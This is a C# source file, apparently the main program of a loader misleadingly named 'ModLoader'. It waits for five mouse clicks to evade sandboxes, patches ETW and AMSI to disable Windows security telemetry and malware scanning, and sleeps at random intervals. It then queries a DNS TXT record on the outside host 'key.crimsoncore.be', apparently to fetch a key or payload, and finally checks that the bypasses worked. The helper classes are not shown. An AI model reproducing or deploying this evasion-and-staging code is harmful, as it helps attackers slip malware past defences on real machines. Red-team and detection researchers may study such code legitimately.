using System;

namespace ModLoader
{ 
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Waiting for 5 clicks...");
            MouseClickWait.WaitForClicks(); // Wait for 5 clicks by default
            string hostname = "key.crimsoncore.be";
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("[+] Patching ETW (ETWEventWrite)...");
            Console.ResetColor();
            ETWPatch.ETWPatching();
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("[+] Patching AMSI CLR...");
            Console.ResetColor();
            try
            {
                AmsiBypass.AmsiBypassStringReplace();
                Console.WriteLine("AMSI bypass executed.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"AMSI bypass failed: {ex.Message}");
            }
            Sleep.RandomSleep();
            try
            {
                string txtRecord = DnsLookup.GetTxtRecord(hostname);
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine(txtRecord != null ? $"[+] TXT record for {hostname}: {txtRecord}" : $"No TXT record found for {hostname}");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
            Console.WriteLine("Press any key to continue...");
            while (Console.KeyAvailable)
                Console.ReadKey(true);
            Console.ReadKey(true);
            Console.WriteLine("Testing AMSI...");
            Console.WriteLine(AmsiTest.TestAmsi() ? "AMSI is working (detected EICAR)." : "AMSI failed or not available...");
            bool isPatched = ETWCheck.ETWChecking();
            //Console.WriteLine("Press any key to continue...");
            //Console.ReadKey();
        }
    }
}